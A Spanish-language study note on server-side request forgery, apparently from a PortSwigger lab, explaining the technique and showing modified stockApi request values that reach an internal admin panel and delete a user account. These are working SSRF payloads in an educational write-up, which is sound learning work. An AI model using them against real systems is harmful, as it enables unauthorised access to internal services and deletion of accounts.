# Server-Side Request Forgery 

Tags: #SSRF #PortSwigger 

```bash 
SSRF: Permite a un atacante manipular la aplicación del servidor para que realice peticiones a recursos internos 'localhost' o externos que no deberían ser accesibles.

	'http://web.com/path?url='

Ejemplo 1:	'http://192.168.1.24/path?url=http://localhost:8080'
	- Por medio del parámetro url se pueden ver servicios internos en el servidor desde la propia máquina que de forma externa no se puede ver 

Ejemplo 2: 'http://46.172.215.123:8080/path?url=http://localhost:80'
		 'http://46.172.215.123:8080/path?url=http://192.168.1.24:5000'
	- Por medio de una red externa con un puerto especifico, se puede mirar otro servicio dentro de la red interna tanto para el localhost como para otra IP
```

## SSRF básico contra servidor local

```bash 
En este lab se aborda un ataque SSRF básico aprovechando una funcionalidad de consulta de stock que realiza peticiones internas. Aunque el panel de administración no es accesible directamente desde el navegador, al interceptar la petición que hace la funcionalidad de stock, modificamos el parámetro correspondiente para forzar una petición a 'localhost'.
```

```bash 
# Petición original 
	stockApi=http://192.168.0.11:8080/product/stock/check?productID=1%26storeId=1
```

```bash 
# Petición modificada con el SSRF que se encuentra en el 'stockApi' del cuerpo de la petición en Burpsuite porque contempla una url 
	stockApi=http://localhost/admin

# Para borrar se debe mirar los hipervinculos de la respuesta y nos dará la estructura de borrado
	stockApi=http://localhost/admin/delete?username=carlos
```